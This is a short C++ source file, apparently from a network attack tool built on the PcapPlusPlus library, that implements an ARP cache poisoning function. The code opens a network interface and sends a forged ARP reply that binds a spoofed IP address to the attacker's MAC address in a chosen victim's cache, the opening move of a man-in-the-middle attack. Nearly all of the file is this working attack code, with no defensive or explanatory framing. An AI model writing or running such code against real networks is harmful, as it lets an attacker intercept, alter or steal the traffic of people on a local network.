#include "arp_poisoning.h"
#include "EthLayer.h"
#include "IpAddress.h"
#include "MacAddress.h"
#include "PcapLiveDeviceList.h"
#include <iostream>

constexpr int MAX_PACKET_LEN = 100;

int ARP::poisonArp(ArpPoisoningOptions &options) {
    pcpp::MacAddress macAttacker(options.macAttacker);
    pcpp::IPv4Address ipAttacker(options.ipAttacker);

    pcpp::MacAddress macVictim(options.macVictim);
    pcpp::IPv4Address ipVictim(options.ipVictim);

    pcpp::IPv4Address ipToSpoof(options.ipToSpoof);

    // Open interface
    pcpp::PcapLiveDevice *dev =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(
            options.interface);

    if (dev == nullptr || !dev->open()) {
        std::cerr << "Unable to open interface ens18" << "\n";

        return 1;
    }

    // Build ARP spoofing packet
    pcpp::EthLayer ethLayer(macAttacker, macVictim, PCPP_ETHERTYPE_ARP);

    pcpp::ArpLayer arpLayer(pcpp::ARP_REPLY, macAttacker, macVictim, ipToSpoof,
                            ipVictim);

    pcpp::Packet packet(MAX_PACKET_LEN);
    packet.addLayer(&ethLayer);
    packet.addLayer(&arpLayer);
    packet.computeCalculateFields();

    // Send packet
    dev->sendPacket(&packet);

    dev->close();

    return 0;
}
